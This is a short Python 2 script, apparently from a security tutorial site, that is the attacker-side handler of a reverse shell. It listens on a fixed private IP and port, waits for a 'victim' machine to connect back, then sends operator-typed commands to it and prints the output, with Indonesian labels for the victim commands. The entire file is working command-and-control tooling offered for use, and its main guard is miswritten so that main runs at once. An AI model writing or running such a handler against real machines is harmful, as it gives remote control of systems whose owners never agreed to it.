#!/usr/bin/python
#written for py-sec.org

import socket
import os


def connectFromVictim():
	connectVictim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connectVictim.bind(("172.16.123.135",10001))
	connectVictim.listen(1)
	print "\n" + "[+] Listening connection from Victim on port: 10001"
	conn, addr = connectVictim.accept()
	print "\n" + "[+] Connection from %s:%s"%(addr[0],addr[1])
	print "\n" + "[+] Our victim connect to us ...." + "\n"

	while True:
		attackerInstruction = raw_input("Shell> ")
		print "\n" + "------------------------------------------------------"
		print "\n" + "Perintah untuk victim: " + attackerInstruction + "\n"
		print "------------------------------------------------------" + "\n"
		if "terminate" in attackerInstruction:
			print "\n" + "Connection to victim closed.." + "\n"
			conn.send("terminate")
			conn.close()
			break
		else:
			conn.send(attackerInstruction)
			print conn.recv(1024)

def main():
	connectFromVictim()


if __name__ == main():
	main()